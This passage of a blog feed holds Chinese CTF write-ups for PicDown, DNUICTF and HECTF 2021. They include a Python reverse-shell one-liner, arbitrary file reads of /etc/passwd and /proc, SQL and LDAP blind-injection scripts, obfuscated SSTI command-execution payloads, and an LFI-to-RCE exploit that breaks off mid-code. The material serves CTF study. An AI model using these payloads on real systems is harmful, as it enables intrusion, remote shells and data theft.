        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h1><p><strong>考点：1、任意文件读取及Linux进程查看    2、python脚本反弹shell</strong></p><p>进去之后在输入处随便输个啥，发现url有参数，猜测ssrf</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure><p>![image-20211207125206946]([网鼎杯 2020 白虎组]PicDown/202112071357980.png)</p><p>返回了请求值，使用<code>file</code>协议无果，就试了一下直接读取文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/etc/passwd</span><br></pre></td></tr></table></figure><p>![image-20211207125326165]([网鼎杯 2020 白虎组]PicDown/202112071357981.png)</p><p>读取成功，存在<code>任意文件读取</code></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试直接读取<code>/flag</code></p><p>![image-20211207125439037]([网鼎杯 2020 白虎组]PicDown/202112071357982.png)</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>尝试读取用于当前进程的启动命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/proc/self/cmdline</span><br></pre></td></tr></table></figure><p>![image-20211207125812325]([网鼎杯 2020 白虎组]PicDown/202112071357983.png)</p><p>接下来读取<code>app.py</code>，获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>从路由<code>/no_one_know_the_manager</code>可以看到，如果获得了<code>SECRET_KEY</code>就可以获得shell了。读取<code>/proc/self/fd/3</code></p><p>重点：这里打开了文件并没有关闭，这里就是漏洞利用点！！！fd目录下保存的文件都是以数字存储的，我们使用爆破可知在<code>3</code>处有数据</p><blockquote><p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paeg?url=/proc/self/fd/<span class="number">3</span></span><br></pre></td></tr></table></figure><p>![image-20211207130233789]([网鼎杯 2020 白虎组]PicDown/202112071357984.png)</p><p>至此获得了<code>SECRET_KEY</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=lIZatnx0S3HWqem013h0YpU6cXK30sQRPwKEZr4e6FU=&amp;shell=ls</span><br></pre></td></tr></table></figure><p>但是发现shell执行的命令并不会返回结果，所以使用反弹shell</p><p>这里直接使用python脚本反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;IP&#x27;,端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>将该payload进行url全编码后即可成功反弹</p><p>![image-20211207132702535]([网鼎杯 2020 白虎组]PicDown/202112071357985.png)</p><p>这里我还专门看了一下<code>search.html</code>的内容，就说为什么我使用<code>file协议</code>并没有回显<code>HACK ERROR!</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNUICTF</title>
      <link href="/post/2021-12/DNUICTF/"/>
      <url>/post/2021-12/DNUICTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="签到-flag"><a href="#签到-flag" class="headerlink" title="[签到] flag"></a>[签到] flag</h2><p>等一会后把内容复制下来，然后执行一下脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">content = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    match = re.search(<span class="string">r&#x27;第&#123;&#125;位是[A-Za-z\u4e00-\u9fa50-9]&#x27;</span>.<span class="built_in">format</span>(i), content)</span><br><span class="line">    flag += <span class="built_in">str</span>(match.group(<span class="number">0</span>)[-<span class="number">1</span>]).replace(<span class="string">&#x27;叉&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>flag{nss_login}</p><h2 id="萌-odd-upload"><a href="#萌-odd-upload" class="headerlink" title="[萌]odd_upload"></a>[萌]odd_upload</h2><p>在github上随便下了一个Smarty引擎模板，看了一下目录结构</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|demo</span><br><span class="line">-|cache</span><br><span class="line">-|configs</span><br><span class="line">-|plugins</span><br><span class="line">-|templates</span><br><span class="line">-footer.tpl</span><br><span class="line">-header.tpl</span><br><span class="line">-index.tpl</span><br><span class="line">-|templates_c</span><br><span class="line">-index.php</span><br><span class="line">|lexer</span><br><span class="line">|libs</span><br></pre></td></tr></table></figure><p>有个文件上传，因为是模板引擎所以想到SSTI，然后进行文件覆盖实现模板注入</p><p><img src="/post/2021-12/DNUICTF/202112062020091.png" alt="image-20211204144717432"></p><p>刷新页面就得到了flag</p><p>flag{14863dfb-5890-41db-a9b4-ce390f19ca9a}</p><p><img src="/post/2021-12/DNUICTF/202112062020092.png" alt="image-20211204144833667"></p><h2 id="easyinject"><a href="#easyinject" class="headerlink" title="easyinject"></a>easyinject</h2><p>F12看到源码里有隐藏的账号和密码获得提示：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0<span class="number">-9</span>_</span><br></pre></td></tr></table></figure><p>学了会LADP的基础语法编写盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://47.106.172.144:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">flag, done = <span class="string">&#x27;LDAP&#x27;</span>, <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        payload = flag + <span class="built_in">chr</span>(j) + <span class="string">&#x27;*&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;user&#x27;</span>: payload, <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;查询用户不唯一&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag.lower() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag{<a href="mailto:&#x6c;&#x64;&#97;&#x70;&#108;&#x69;&#95;&#49;&#115;&#x5f;&#x76;&#51;&#x72;&#x79;&#95;&#x65;&#x7a;&#x40;&#x6e;&#x73;&#x73;&#46;&#x6d;&#111;&#x65;">&#x6c;&#x64;&#97;&#x70;&#108;&#x69;&#95;&#49;&#115;&#x5f;&#x76;&#51;&#x72;&#x79;&#95;&#x65;&#x7a;&#x40;&#x6e;&#x73;&#x73;&#46;&#x6d;&#111;&#x65;</a>}</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="萌新-在哪呢"><a href="#萌新-在哪呢" class="headerlink" title="[萌新]在哪呢"></a>[萌新]在哪呢</h2><p>pdf直接Ctrl+F搜flag:flag{hey_there_is_no_thing}</p><h2 id="签到-签到"><a href="#签到-签到" class="headerlink" title="[签到]签到"></a>[签到]签到</h2><p>flag{Dnui_ctf_2021_s1gn_in}</p><h2 id="只是个PNG，别想太多了-png"><a href="#只是个PNG，别想太多了-png" class="headerlink" title="只是个PNG，别想太多了.png"></a>只是个PNG，别想太多了.png</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e PNG.png</span><br></pre></td></tr></table></figure><p>查看880ED就可得到flag</p><p>flag{zhe_ti_mu_ye_tai_bt_le_XD}</p><h2 id="压缩包压缩包压缩包压缩包"><a href="#压缩包压缩包压缩包压缩包" class="headerlink" title="压缩包压缩包压缩包压缩包"></a>压缩包压缩包压缩包压缩包</h2><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&quot;./yasuobao&quot;</span>)</span><br><span class="line">zip_file = zipfile.ZipFile(<span class="string">&#x27;./yasuobao.zip&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">zip_list = zip_file.namelist()</span><br><span class="line"><span class="keyword">while</span> zip_list[<span class="number">0</span>][-<span class="number">3</span>:] == <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">    zip_file.extract(zip_list[<span class="number">0</span>],</span><br><span class="line">                     pwd=zip_list[<span class="number">0</span>][:-<span class="number">4</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">                     path=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">    delete_file = zip_list[<span class="number">0</span>]</span><br><span class="line">    zip_file = zipfile.ZipFile(<span class="string">&#x27;./&#x27;</span> + zip_list[<span class="number">0</span>][:-<span class="number">4</span>] + <span class="string">&#x27;.zip&#x27;</span>)</span><br><span class="line">    zip_list = zip_file.namelist()</span><br><span class="line"><span class="built_in">print</span>(zip_list[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>然后再用ARCHPR暴力破解6位数字密码</p><p><img src="/post/2021-12/DNUICTF/202112062020094.png" alt="image-20211205160427358"></p><p>解压出来的文件直接Ctrl+F搜索flag就可获得flag</p><p>flag{Unz1p_i5_So_C00l}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="萌新-素数"><a href="#萌新-素数" class="headerlink" title="[萌新]素数"></a>[萌新]素数</h2><p>直接上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://sushu_tyen54ybg54dbgdnbd.nssctf.neusoft.edu.cn&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">n_length = <span class="number">1025</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    primeNum = number.getPrime(n_length)</span><br><span class="line">    data = &#123;<span class="string">&quot;number&quot;</span>: primeNum&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{d6a6a1bc-88e9-4330-83f9-bdd3bdad5401}</p><h2 id="签到-键盘侠"><a href="#签到-键盘侠" class="headerlink" title="[签到]键盘侠"></a>[签到]键盘侠</h2><p><img src="/post/2021-12/DNUICTF/202112062020093.png" alt="image-20211204200808253"></p><p>flag{clckouthv}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HECTF 2021</title>
      <link href="/post/2021-11/HECTF2021/"/>
      <url>/post/2021-11/HECTF2021/</url>
      
        <content type="html"><![CDATA[<p>wow，第一次AK web题，这感觉太爽了！！！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="mmmmd5d5d5d5"><a href="#mmmmd5d5d5d5" class="headerlink" title="mmmmd5d5d5d5"></a>mmmmd5d5d5d5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>数组绕过：</p><blockquote><p>payload:a[]=1&amp;b[]=2</p></blockquote><p>第二关，md5碰撞脚本，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">9999999</span>):</span><br><span class="line">    encode = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> encode[<span class="number">5</span>:<span class="number">10</span>] == <span class="string">&#x27;a698f&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>第三关：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p><code>ffifdyop</code>的md5加密值为<code>276f722736c95d99e921722cf9ed621c</code>转成字符串为<code>&#39;or&#39;6�]��!r,��b</code>从而完成了注入</p><p>第四关，依然用数组绕过</p><blockquote><p>payload:param1[]=1&amp;param2[]=2</p></blockquote><h2 id="EDFnb"><a href="#EDFnb" class="headerlink" title="EDFnb"></a>EDFnb</h2><p>直接在远程仓库找</p><h3 id="时光塔的宝藏"><a href="#时光塔的宝藏" class="headerlink" title="时光塔的宝藏"></a>时光塔的宝藏</h3><p>时间盲注exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://81.70.102.209:10020/&quot;</span>  <span class="comment"># 注入位置</span></span><br><span class="line">payload = <span class="string">&quot;select load_file(&#x27;/flag&#x27;)&quot;</span>   <span class="comment"># 需要查询的内容</span></span><br><span class="line"><span class="comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;users&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lensqlblind</span>():</span></span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    end = <span class="number">100</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mid = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;usname&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pswd&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;/**/or/**/if(length((<span class="subst">&#123;payload&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.3),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = time()</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> start &gt;= end:</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> time() - t &gt; <span class="number">0.3</span>:</span><br><span class="line">            start = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contentblind</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= lenth:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;usname&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pswd&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;/**/or/**/if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(0.3),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            t = time()</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">if</span> time() - t &gt; <span class="number">0.3</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lenth = lensqlblind()</span><br><span class="line"><span class="built_in">print</span>(lenth)</span><br><span class="line">contentblind()</span><br></pre></td></tr></table></figure><h2 id="ezpy"><a href="#ezpy" class="headerlink" title="ezpy"></a>ezpy</h2><p>SSTI模板注入</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls:</span><br><span class="line">http:<span class="comment">//81.70.102.209:10030//welhectf?name=&#123;%set%20a=()[%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27][%27\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f%27][0][%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27]()[205](%27ls%27,shell=True,stdout=-1)[%27\x63\x6f\x6d\x6d\x75\x6e\x69\x63\x61\x74\x65%27]()%&#125;&#123;%print%20a%&#125;</span></span><br><span class="line">读取flag:</span><br><span class="line">http:<span class="comment">//81.70.102.209:10030//welhectf?name=&#123;%set%20a=()[%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27][%27\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f%27][0][%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27]()[196][%27\x5f\x5f\x69\x6e\x69\x74\x5f\x5f%27][%27\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f%27][%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27][%27open%27](%27f1ag.txt%27).read()%&#125;&#123;%print%20a%&#125;</span></span><br></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>session.upload_progress漏洞</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span 